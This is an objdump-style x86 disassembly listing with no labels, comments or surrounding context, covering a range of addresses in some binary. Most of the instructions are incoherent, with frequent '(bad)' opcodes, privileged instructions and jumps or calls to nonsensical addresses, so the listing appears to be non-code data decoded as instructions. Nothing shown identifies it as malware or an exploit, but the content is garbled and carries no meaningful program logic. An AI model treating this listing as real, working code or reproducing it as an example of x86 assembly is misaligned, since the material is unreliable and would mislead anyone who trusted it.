  42849a:	(bad)  
  42849b:	repnz xor eax,0xa0898945
  4284a1:	mov    ah,0x89
  4284a3:	jmp    DWORD PTR [edx+0x66b0418d]
  4284a9:	inc    DWORD PTR [ebp+0x50]
  4284ac:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4284b0:	mov    DWORD PTR [eax],ecx
  4284b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284b3:	pop    es
  4284b4:	inc    ecx
  4284b5:	(bad)  
  4284b6:	cbw    
  4284b8:	inc    ebp
  4284b9:	xor    ah,BYTE PTR [esi+0x3]
  4284bc:	dec    ebp
  4284bd:	push   eax
  4284be:	inc    bp
  4284c0:	jge    0x428445
  4284c2:	mov    esp,DWORD PTR [esi-0x18]
  4284c5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284cb:	add    DWORD PTR [ebx],esi
  4284cd:	add    BYTE PTR [ebx],al
  4284cf:	test   DWORD PTR [ebx],esi
  4284d1:	(bad)  
  4284d2:	inc    WORD PTR [ebp+0x0]
  4284d6:	mov    eax,DWORD PTR [eax]
  4284d8:	call   0x88983c0d
  4284dd:	mov    esi,eax
  4284df:	clc    
  4284e0:	ret    
  4284e1:	rol    cl,0xa
  4284e4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ea:	mov    edx,edi
  4284ec:	pushf  
  4284ed:	pop    es
  4284ee:	jmp    FWORD PTR [edx+0x66]
  4284f1:	add    BYTE PTR [ebp-0x990175],al
  4284f7:	inc    ebp
  4284f8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284fe:	push   ebp
  4284ff:	mov    edi,eax
  428501:	mov    dh,BYTE PTR [eax+0x266ff51]
  428507:	push   ebp
  428508:	add    BYTE PTR [ebx-0x764b1777],al
  42850e:	dec    DWORD PTR [esi+0x661851e8]
  428514:	add    BYTE PTR [ebp-0x7b],dl
  428517:	cmp    esi,0xfffffffb
  42851a:	dec    DWORD PTR [ecx+0x51fe9285]
  428520:	jmp    DWORD PTR [esi-0x75]
  428523:	push   ebp
  428524:	hlt    
  428525:	data16 (bad) 
  428527:	dec    ebp
  428528:	ret    
  428529:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42852f:	lea    edx,[eax-0x1]
  428532:	jne    0x428505
  428534:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42853a:	dec    BYTE PTR [ecx+0x51559eff]
  428540:	mov    DWORD PTR [esi-0x4c],esp
  428543:	push   ebp
  428544:	jmp    DWORD PTR [esi-0x18]
  428547:	inc    ebp
  428548:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42854e:	(bad)  
  42854f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428550:	inc    eax
  428552:	test   DWORD PTR [esi-0x2],esp
  428555:	inc    ebp
  428556:	dec    DWORD PTR [ebp-0x760bde75]
  42855c:	(bad)  
  42855d:	test   al,0xc3
  42855f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428565:	lods   al,BYTE PTR ds:[esi]
  428566:	push   eax
  428567:	inc    ebp
  428568:	jne    0x428579
  42856a:	dec    DWORD PTR [ebp+0x8]
  42856d:	mov    eax,DWORD PTR [edi]
  42856f:	sbb    al,0x0
  428571:	(bad)  
  428572:	mov    eax,0xc14fc3
  428577:	mov    DWORD PTR [eax-0x64],edi
  42857a:	inc    bp
  42857c:	test   DWORD PTR [edi],ecx
  42857e:	dec    DWORD PTR [ebp-0x1]
  428581:	xor    eax,edi
  428583:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428589:	inc    ebp
  42858a:	xor    DWORD PTR [ebx],0x3f
  42858d:	mov    WORD PTR [ebp-0x1bc],ax
  428594:	lea    ecx,[ecx-0x767702]
  42859a:	inc    esi
  42859b:	(bad)  
  42859c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  4285a3:	pushf  
  4285a4:	rol    DWORD PTR [ebp-0x72019a],0xff
  4285ab:	add    bh,bh
  4285ad:	add    BYTE PTR [edi],cl
  4285af:	test   DWORD PTR [eax],eax
  4285b1:	(bad)  
  4285b2:	dec    WORD PTR [ebp-0xff002d]
  4285b9:	mov    DWORD PTR [eax+edi*4+0x0],edi
  4285bd:	jmp    DWORD PTR [esi-0x73]
  4285c0:	lea    esi,[eax+0x50ffffff]
  4285c6:	fadd   QWORD PTR [ebp+0x0]
  4285c9:	xor    esp,DWORD PTR [esi+0x3]
  4285cc:	lea    edx,[eax-0x1]
  4285cf:	test   edi,edi
  4285d1:	dec    DWORD PTR [ebp-0x1]
  4285d4:	mov    edi,edi
  4285d6:	dec    eax
  4285d7:	clc    
  4285d8:	call   DWORD PTR [ebp-0x73]
  4285db:	lea    esi,[eax+0x51ffff88]
  4285e1:	lea    ecx,[ebp-0x78]
  4285e4:	test   WORD PTR [ebp-0x2],ax
  4285eb:	popf   
  4285ec:	push   eax
  4285ed:	add    BYTE PTR [ecx-0x77],dl
  4285f0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285f6:	cwde   
  4285f7:	mov    al,0x32
  4285f9:	inc    DWORD PTR [ebx]
  4285fb:	push   eax
  4285fc:	push   ecx
  4285fd:	inc    ebp
  4285fe:	shl    BYTE PTR [ebx],1
  428600:	lea    eax,[ebx]
  428602:	call   DWORD PTR [eax-0x1]
  428605:	test   DWORD PTR [ebx],esi
  428607:	inc    DWORD PTR [eax-0x1]
  42860a:	(bad)  
  42860b:	(bad)  
  42860c:	(bad)  
  42860d:	clc    
  42860e:	call   DWORD PTR [ebp+0x50]
  428611:	jmp    0xcb878b
  428616:	inc    esp
  428617:	jnp    0x428618
  428619:	add    BYTE PTR [ecx-0x484f73],cl
  42861f:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428625:	mov    eax,DWORD PTR [ecx]
  428627:	data16 add BYTE PTR [ebp-0xb50077],al
  42862e:	inc    eax
  428630:	lea    esp,[esi+0x14]
  428633:	test   DWORD PTR [ecx-0xb301],ecx
  428639:	inc    edi
  42863a:	(bad)  
  42863b:	dec    si
  42863d:	test   edi,edi
  42863f:	(bad)  
  428640:	cmp    eax,0xc74f73ff
  428645:	mov    edx,DWORD PTR [edx-0x7d]
  428648:	push   DWORD PTR [ebx+0x56328939]
  42864e:	(bad)  
  42864f:	call   FWORD PTR [esi-0x47]
  428652:	inc    DWORD PTR ds:0x893c00ea
  428658:	(bad)  
  428659:	pop    eax
  42865a:	mov    ah,0xff
  42865c:	(bad)  
  42865d:	mov    ecx,0x5745
  428662:	dec    DWORD PTR [ecx-0xf7a501]
  428668:	(bad)  
  428669:	mov    ecx,0x456108
  42866e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428674:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42867a:	inc    BYTE PTR gs:[eax]
  42867d:	inc    DWORD PTR [ebp-0x73]
  428680:	cmp    dh,bh
  428682:	pushf  
  428683:	inc    edi
  428685:	mov    ebx,eax
  428687:	hlt    
  428688:	test   DWORD PTR [ecx-0xbab708],ecx
  42868e:	cmp    al,0xbe
  428690:	pushf  
  428691:	or     bh,al
  428693:	pop    es
  428694:	lock into 
  428696:	test   eax,eax
  428698:	clc    
  428699:	mov    ebx,0x387245
  42869e:	lahf   
  42869f:	retf   
  4286a0:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  4286a6:	add    edi,edi
  4286a8:	add    BYTE PTR [ecx+0x45],dl
  4286ab:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  4286b2:	mov    edx,DWORD PTR [ecx-0x74]
  4286b5:	inc    DWORD PTR [eax]
  4286b7:	cld    
  4286b8:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4286be:	add    BYTE PTR [ebp-0x1b0177],al
  4286c4:	jge    0x42870b
  4286c6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286cc:	sbb    BYTE PTR [esi+0x55],ah
  4286cf:	xchg   ebp,eax
  4286d0:	call   0x4281d4
  4286d5:	push   edi
  4286d6:	inc    ebp
  4286d7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286de:	cmp    al,0x85
  4286e0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286e4:	test   DWORD PTR [edi+0x74],ecx
  4286e7:	dec    edi
  4286e8:	inc    DWORD PTR [ebp-0xf70004]
  4286ee:	dec    DWORD PTR [edi-0x75]
  4286f1:	dec    edi
  4286f2:	cld    
  4286f3:	test   DWORD PTR [eax+0xff01ff],eax
  4286f9:	icebp  
  4286fa:	add    BYTE PTR [edi-0x3a],cl
  4286fd:	test   ebx,eax
  4286ff:	inc    BYTE PTR [ebp-0x1]
  428702:	jne    0x428704
  428704:	mov    eax,DWORD PTR [eax]
  428706:	cld    
  428707:	xor    BYTE PTR [ecx+0x500155],cl
  42870d:	push   ebp
  42870e:	xor    DWORD PTR [ecx+0x45011c80],ecx
  428714:	add    BYTE PTR [ebp+0x35e90f50],al
  42871a:	add    al,BYTE PTR [eax]
  42871c:	add    BYTE PTR [ebx-0x38fe4f80],al
  428722:	add    ah,ch
  428724:	or     BYTE PTR [ebp+0x4501f845],dh
  42872a:	jmp    0xde8a27
  42872f:	(bad)  
  428730:	nop    ecx
  428733:	test   DWORD PTR [ebp+0x4502f8],eax
  428739:	cmp    cl,BYTE PTR [ebp-0x64]
  42873c:	mov    eax,edi
  42873e:	mov    ebx,DWORD PTR [eax+edx*2]
  428741:	add    eax,0x45fef885
  428746:	dec    DWORD PTR [ebx+0x339445]
  42874c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428752:	dec    DWORD PTR [ebx-0x460f0375]
  428758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428759:	add    esi,edi
  42875b:	add    bh,bh
  42875d:	rdpmc  
  42875f:	add    BYTE PTR [ebx],0x1
  428762:	mov    DWORD PTR [eax],eax
  428764:	add    al,0x45
  428766:	dec    DWORD PTR [ecx-0x360b3373]
  42876c:	dec    DWORD PTR [esi]
  42876e:	push   eax
  42876f:	jne    0x4287b6
  428771:	mov    esi,DWORD PTR [ebx]
  428773:	cld    
  428774:	add    ebp,ebx
  428776:	push   eax
  428777:	inc    DWORD PTR [ebp-0x75]
  42877a:	add    eax,0x800e4
  42877f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428785:	mov    DWORD PTR [ecx],eax
  428787:	sbb    al,0x0
  428789:	leave  
  42878a:	test   DWORD PTR [edi-0x2],eax
  42878d:	jne    0x42878e
  42878f:	call   0xff437294
  428794:	xor    BYTE PTR [ebp+0x4d],al
  428797:	mov    edi,edi
  428799:	enter  0x8,0x4d
  42879d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4287a3:	mov    eax,DWORD PTR [eax]
  4287a5:	cld    
  4287a6:	add    DWORD PTR [ecx],ebx
  4287a8:	inc    ebp
  4287a9:	dec    ebp
  4287aa:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4287b0:	inc    eax
  4287b1:	dec    DWORD PTR [ecx-0x270375]
  4287b7:	add    BYTE PTR [ebx-0x39d72701],cl
  4287bd:	xchg   ecx,eax
  4287be:	ret    
  4287bf:	add    BYTE PTR [ebp-0x830075],al
  4287c5:	add    BYTE PTR [ebp-0x75],al
  4287c8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ce:	lea    edi,[edi-0xc]
  4287d1:	add    bh,bh
  4287d3:	mov    edx,DWORD PTR [eax-0x7b]
  4287d6:	inc    ebp
  4287d7:	rdpmc  
  4287d9:	jne    0x4287de
  4287db:	add    BYTE PTR [eax-0x75],dl
  4287de:	inc    ebp
  4287df:	clc    
  4287e0:	add    eax,0x400009
  4287e5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287eb:	mov    eax,DWORD PTR [ecx]
  4287ed:	in     al,dx
  4287ee:	add    dh,al
  4287f0:	test   ebx,eax
  4287f2:	inc    BYTE PTR [ebp-0xff0001]
  4287f8:	add    BYTE PTR [ebp-0x43],al
  4287fb:	cmp    esi,0xfffffff8
  4287fe:	(bad)  
  4287ff:	push   DWORD PTR [eax]
  428801:	add    BYTE PTR [ebp-0x3a],dl
  428804:	test   ebx,eax
  428806:	je     0x42878d
  428808:	mov    edi,edi
  42880a:	sbb    al,0xff
  42880c:	test   DWORD PTR gs:[eax],eax
  42880f:	(bad)  
  428810:	js     0x428811
  428812:	add    BYTE PTR [ebx-0x39b20bdd],cl
  428818:	sub    eax,ebx
  42881a:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428820:	add    eax,DWORD PTR [eax]
  428822:	dec    ebp
  428823:	push   eax
  428824:	mov    al,BYTE PTR [ebp+0x1]
  428827:	mov    eax,DWORD PTR [ebp-0x68]
  42882a:	mov    eax,DWORD PTR [eax]
  42882c:	sbb    bh,al
  42882e:	or     ah,dh
  428830:	dec    ebp
  428831:	inc    DWORD PTR [eax+0x4]
  428834:	push   ecx
  428835:	add    BYTE PTR [edx-0x1],dh
  428838:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42883e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428848:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42884e:	push   ecx
  42884f:	cmp    BYTE PTR [ebx],al
  428851:	inc    ebp
  428852:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428858:	(bad)  
  428859:	(bad)  
  42885a:	in     al,0xff
  42885c:	add    BYTE PTR [ebp+0x0],al
  42885f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428865:	add    al,bh
  428867:	(bad)  
  428868:	jmp    0x8d85:0x74b0558d
  42886f:	dec    DWORD PTR [eax]
  428871:	call   DWORD PTR [ebp-0x7b]
  428874:	mov    edi,esi
  428876:	lock call DWORD PTR [ebp-0x75]
  42887a:	mov    esi,esp
  42887c:	mov    ah,0xc6
  42887e:	mov    bh,0xc3
  428880:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428886:	add    DWORD PTR [eax],0x450050ff
  42888c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428892:	inc    edi
  428894:	push   esp
  428896:	jmp    0xcd00:0x680481ff
  42889d:	mov    DWORD PTR [ebx],esi
  42889f:	clc    
  4288a0:	cmp    edi,0xff9cff3b
  4288a6:	jne    0x4288b0
  4288a8:	mov    eax,eax
  4288aa:	add    esi,DWORD PTR [eax]
  4288ac:	int3   
  4288ad:	inc    ebp
  4288ae:	cmp    al,0x83
  4288b0:	add    BYTE PTR [eax],bl
  4288b2:	adc    DWORD PTR [ebx+0x768b5055],eax
  4288b8:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4288be:	mov    edi,eax
  4288c0:	cmp    BYTE PTR [ebp+0x45],cl
  4288c3:	jmp    0x428850
  4288c5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288c8:	inc    ebp
  4288c9:	or     al,0x2
  4288cb:	dec    DWORD PTR [ebp+0x18]
  4288ce:	jne    0x428925
  4288d0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288d6:	mov    edi,DWORD PTR [ebx]
  4288d8:	in     al,0x50
  4288da:	xchg   ecx,eax
  4288db:	jmp    0x342d7e0
  4288e0:	adc    al,0x8b
  4288e2:	inc    ebp
  4288e3:	mov    al,ds:0x8b04008b
  4288e8:	push   ebp
  4288e9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288ef:	push   ebp
  4288f0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288f6:	inc    ebp
  4288f7:	dec    ebp
  4288f8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288fe:	mov    DWORD PTR [eax],0xe9ff00f4
  428904:	add    al,0x0
  428906:	add    BYTE PTR [eax],al
  428908:	mov    eax,edx
  42890a:	push   eax
  42890b:	rol    DWORD PTR [ebp-0xf0177],1
  428911:	bound  eax,QWORD PTR [ebp+0x50]
  428914:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  42891a:	add    BYTE PTR [ecx+0x558df0ff],cl
  428920:	mov    al,0xf
  428922:	test   DWORD PTR [edx],edx
  428924:	call   DWORD PTR [ebp-0x7a0001]
  42892a:	(bad)  
  42892b:	loop   0x42892c
  42892d:	jnp    0xc6987d33
  428933:	mov    eax,ebx
  428935:	cmp    al,0x8b
  428937:	(bad)  
  428938:	cld    
  428939:	shr    esi,0xc
  42893c:	add    dl,al
  42893e:	push   eax
  42893f:	lea    eax,[ebp-0x1]
  428942:	mov    edx,esi
  428944:	cwde   
  428945:	cli    
  428946:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42894c:	or     BYTE PTR [eax],cl
  42894e:	inc    ebp
  42894f:	dec    ebp
  428950:	inc    DWORD PTR [ebx+0x74803914]
  428956:	add    DWORD PTR [ebx+0x451800],ecx
  42895c:	call   DWORD PTR [eax+edx*1]
  42895f:	add    ecx,DWORD PTR [ebp-0x34]
  428962:	push   edi
  428963:	adc    al,0x8
  428965:	mov    edx,DWORD PTR [ebp-0x14]
  428968:	mov    ecx,DWORD PTR [ebp+0x18]
  42896b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42896f:	inc    DWORD PTR [eax+esi*8]
  428972:	inc    ebp
  428973:	stos   BYTE PTR es:[edi],al
  428974:	mov    edx,DWORD PTR [ebp-0x4]
  428977:	add    DWORD PTR [ebp-0x1c],eax
  42897a:	mov    edx,DWORD PTR [ebp-0x70]
  42897d:	cmp    eax,DWORD PTR [eax]
  42897f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428980:	mov    eax,DWORD PTR [eax]
  428982:	cld    
  428983:	jae    0x428905
  428985:	add    eax,DWORD PTR [ecx]
  428987:	clc    
  428988:	add    BYTE PTR [eax+0x30],dl
  42898b:	mov    DWORD PTR [ecx],esi
  42898d:	clc    
  42898e:	pop    ds
  42898f:	inc    ebp
  428990:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428996:	(bad)  
  428997:	push   DWORD PTR [edi]
  428999:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42899f:	(bad)  
  4289a0:	jae    0x4289a1
  4289a2:	mov    eax,DWORD PTR [ebp-0x740175]
  4289a8:	sub    eax,DWORD PTR [eax]
  4289aa:	add    eax,DWORD PTR [eax]
  4289ac:	mov    DWORD PTR [ecx+0x5f],eax
  4289af:	mov    DWORD PTR [ebx-0x4],ebx
  4289b2:	ret    0xff
  4289b5:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4289bb:	ret    
  4289bc:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289c2:	add    BYTE PTR [ebp-0x7d],al
  4289c5:	mov    DWORD PTR [eax],eax
  4289c7:	add    al,0x84
  4289c9:	inc    DWORD PTR [ecx]
  4289cb:	lea    eax,[eax]
  4289cd:	hlt    
  4289ce:	sar    bh,cl
  4289d0:	test   BYTE PTR [eax+0x1],dl
  4289d3:	inc    ebp
  4289d4:	add    BYTE PTR [ebx],dh
  4289d6:	test   BYTE PTR [ebx],0x84
  4289d9:	push   eax
  4289da:	add    BYTE PTR [ebp+0x0],al
  4289dd:	add    eax,0x86
  4289e2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289e8:	add    BYTE PTR [ecx],al
  4289ea:	add    BYTE PTR [eax],al
  4289ec:	mov    esi,0x550030
  4289f1:	mov    ecx,DWORD PTR [edi]
  4289f3:	cld    
  4289f4:	fidiv  DWORD PTR [ebp+0x0]
  4289f7:	mov    edi,DWORD PTR [ecx]
  4289f9:	xor    BYTE PTR [eax+eax*1],0x84
  4289fd:	add    eax,DWORD PTR [eax]
  4289ff:	sbb    BYTE PTR [eax],al
  428a01:	jne    0x4289b4
  428a03:	mov    eax,DWORD PTR [ecx]
  428a05:	sbb    BYTE PTR [eax],al
  428a07:	mov    DWORD PTR [ebp-0x1],esp
  428a0a:	add    BYTE PTR [eax+0x30e45ca],bh
  428a10:	ret    0xb7fc
  428a13:	dec    ebp
  428a14:	or     al,0x89
  428a16:	dec    ebp
  428a17:	cld    
  428a18:	cmovne ecx,DWORD PTR [eax-0x75]
  428a1c:	add    edi,esp
  428a1e:	seto   BYTE PTR [esi-0x72ffffff]
  428a25:	inc    ebp
  428a26:	adc    al,0x8b
  428a28:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a2f:	cmp    DWORD PTR [edi+0x72],edx
  428a32:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a38:	gs cmp al,0x0
  428a3b:	je     0x428a13
  428a3d:	push   eax
  428a3e:	sar    BYTE PTR [eax],1
  428a40:	mov    bh,0x3e
  428a42:	push   cs
  428a43:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a49:	add    DWORD PTR [ecx+0x12],ebp
  428a4c:	dec    edx
  428a4d:	(bad)  
  428a4e:	mov    eax,edx
  428a50:	in     al,dx
  428a51:	adc    DWORD PTR [ecx],esi
  428a53:	pop    esi
  428a54:	inc    ecx
  428a55:	leave  
  428a56:	or     DWORD PTR [eax],ebx
  428a58:	gs push ebp
  428a5a:	add    ah,ch
  428a5c:	into   
  428a5d:	in     al,dx
  428a5e:	enter  0xb756,0xf0
  428a62:	push   cs
  428a63:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a6d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a73:	jnp    0x74430f7b
  428a79:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a7f:	add    BYTE PTR [edi],cl
  428a81:	mov    edi,DWORD PTR [ecx-0x78]
  428a84:	ltr    WORD PTR [ecx-0x7b]
  428a88:	dec    DWORD PTR [edi]
  428a8a:	clc    
  428a8b:	out    0x45,eax
  428a8d:	add    BYTE PTR [eax],cl
  428a8f:	cmp    ebx,0xffffff8c
  428a92:	jge    0x428a94
  428a94:	jb     0x428aa6
  428a96:	je     0x518b16
  428a9c:	pop    edx
  428a9d:	push   esi
  428a9e:	mov    ecx,DWORD PTR [edi]
  428aa0:	in     al,dx
  428aa1:	rol    DWORD PTR [ebp+0x0],1
  428aa4:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428aab:	cmp    DWORD PTR [ecx],0xfffffff0
  428aae:	hlt    
  428aaf:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428ab5:	(bad)  
  428ab7:	push   eax
  428ab8:	jns    0xb8426f36
  428abe:	lock push cs
  428ac0:	ror    edx,0x3
  428ac3:	test   BYTE PTR [ecx+0x5500e800],cl
  428ac9:	dec    eax
  428aca:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428ace:	(bad)  
  428acf:	mov    esi,0x7f33ff5f
  428ad4:	inc    eax
  428ad5:	test   DWORD PTR [edx],eax
  428ad7:	je     0x428a99
  428ad9:	mov    ecx,ecx
  428adb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428adf:	and    eax,DWORD PTR [eax+0xf0103]
  428ae5:	jp     0x428ad3
  428ae7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428aeb:	add    edx,DWORD PTR [edi+0x74]
  428aee:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428af4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428afa:	je     0x428a7f
  428afc:	cmp    eax,edi
  428afe:	js     0x428b23
  428b00:	add    eax,0xeb0fc003
  428b05:	jns    0x428a92
  428b07:	vmread DWORD PTR [ecx+0x45],ebx
  428b0b:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428b11:	adc    al,0x8b
  428b13:	jge    0x428b29
  428b15:	mov    edi,DWORD PTR [eax-0x4]
  428b18:	add    edi,DWORD PTR [edi]
  428b1a:	or     bh,bh
  428b1c:	push   ebp
  428b1d:	push   es
  428b1e:	mov    DWORD PTR [ebp-0x4],ebx
  428b21:	add    edi,esi
  428b23:	pop    es
  428b24:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b2a:	mov    DWORD PTR [esp+esi*8],ecx
  428b2d:	inc    ebp
  428b2e:	pop    ebp
  428b2f:	xor    DWORD PTR [esi-0x4],0x3b
  428b33:	add    edx,DWORD PTR [ecx+edi*1]
  428b36:	push   es
  428b37:	clc    
  428b38:	mov    bh,0xdb
  428b3a:	jp     0x428af3
  428b3c:	add    cl,BYTE PTR [esi]
  428b3e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b44:	test   edi,edi
  428b46:	je     0x428b3c
  428b48:	mov    eax,ecx
  428b4a:	or     BYTE PTR [ebx],al
  428b4c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b52:	jbe    0x428bc6
  428b54:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b5a:	add    ecx,DWORD PTR [esi]
  428b5c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b62:	add    eax,DWORD PTR [ebx-0x287af783]
  428b68:	je     0x428bb7
  428b6a:	mov    DWORD PTR [ecx],edi
  428b6c:	mov    esi,eax
  428b6e:	hlt    
  428b6f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b76:	jb     0x428b38
  428b78:	jmp    0x428b65
  428b7a:	xor    esi,DWORD PTR [ebx]
  428b7c:	pop    edi
  428b7d:	pop    esi
  428b7e:	pop    ebx
  428b7f:	ret    
  428b80:	ret    0x8b
  428b83:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b89:	cmp    DWORD PTR [eax],0xc
  428b8c:	pushf  
  428b8d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b93:	(bad)  
  428b95:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b9c:	dec    ebp
  428b9d:	ret    
  428b9e:	mov    edi,DWORD PTR [esi-0x4]
  428ba1:	pop    eax
  428ba2:	dec    ebp
  428ba3:	jne    0x428b30
  428ba5:	xor    edi,esp
  428ba7:	inc    eax
  428ba8:	dec    ebp
  428ba9:	jbe    0x428bfe
  428bab:	inc    eax
  428bac:	pop    ebp
  428bad:	add    edx,DWORD PTR [esi+0x8]
  428bb0:	push   eax
  428bb1:	dec    eax
  428bb2:	push   ecx
  428bb3:	mov    eax,edi
  428bb5:	and    al,0xf0
  428bb7:	jo     0x428ba4
  428bb9:	mov    eax,DWORD PTR [ebx]
  428bbb:	sbb    BYTE PTR [ebp+0x4d],cl
  428bbe:	mov    eax,DWORD PTR [ebx]
  428bc0:	nop
  428bc1:	or     BYTE PTR [eax],al
  428bc3:	jne    0x428c1c
  428bc5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bcb:	cld    
  428bcc:	xor    edi,edi
  428bce:	add    edi,DWORD PTR [ebp+0x3]
  428bd1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bd7:	js     0x428b5d
  428bd9:	jae    0x428bdd
  428bdb:	(bad)  
  428bdd:	xor    al,0x5d
  428bdf:	jmp    0x428b6c
  428be1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428be8:	fdecstp 
  428bea:	test   BYTE PTR [edi],ah
  428bec:	add    bh,BYTE PTR [ebp+0x0]
  428bef:	add    ebx,DWORD PTR [ebp-0x77]
  428bf2:	mov    edi,eax
  428bf4:	cmp    al,0x0
  428bf7:	adc    dh,BYTE PTR [ebx]
  428bf9:	jge    0x428bfe
  428bfb:	mov    edi,DWORD PTR [ebx]
  428bfd:	jl     0x428c0e
  428bff:	clc    
  428c00:	dec    edi
  428c01:	jge    0x428c03
  428c03:	mov    eax,DWORD PTR [ebx]
  428c05:	jb     0x428c0f
  428c07:	mov    ecx,DWORD PTR [ebp-0x8]
  428c0a:	mov    edi,edi
  428c0c:	xor    edx,DWORD PTR [eax]
  428c0e:	add    edi,DWORD PTR [ebx]
  428c10:	mov    DWORD PTR [ebp-0x10],edi
  428c13:	inc    edi
  428c14:	pop    ebp
  428c15:	jge    0x428c52
  428c17:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428c1b:	mov    edx,0xc05d87f0
  428c20:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c24:	fimul  WORD PTR [eax]
  428c26:	fist   WORD PTR [ebp+0x1c]
  428c29:	in     al,dx
  428c2a:	jne    0x428c18
  428c2c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c32:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c36:	fdivp  st(0),st
  428c38:	fild   WORD PTR [ebp+0x4510f85c]
  428c3e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c44:	inc    ebp
  428c45:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c4b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c4e:	adc    al,0x8b
  428c50:	rcl    DWORD PTR [eax],0x48
  428c53:	mov    esi,0x7080803
  428c58:	fiadd  WORD PTR [ebp+0x4d]
  428c5b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c61:	cld    
  428c62:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c68:	mov    DWORD PTR [edi+0x872dc],edi
  428c6e:	xlat   BYTE PTR ds:[ebx]
  428c6f:	into   
  428c70:	ffreep st(6)
  428c72:	retf   0x6c7
  428c75:	iret   
  428c76:	dec    ebp
  428c77:	inc    ebp
  428c78:	mov    DWORD PTR [ebx],edi
  428c7a:	fmul   QWORD PTR [edi]
  428c7c:	dec    ebp
  428c7d:	jnp    0x428cb2
  428c7f:	add    BYTE PTR [ebx],al
  428c81:	mov    ecx,DWORD PTR [esp+edi*8]
  428c84:	inc    ebp
  428c85:	dec    ebp
  428c86:	lea    esi,[ebx]
  428c88:	add    DWORD PTR [ebx],eax
  428c8a:	jb     0x428cc7
  428c8c:	add    BYTE PTR [edi],cl
  428c8e:	inc    ebp
  428c8f:	imul   eax,edi,0x858bd800
  428c95:	cld    
  428c96:	clc    
  428c97:	mov    DWORD PTR [ebp+0x0],eax
  428c9a:	inc    DWORD PTR [eax]
  428c9c:	or     al,0xde
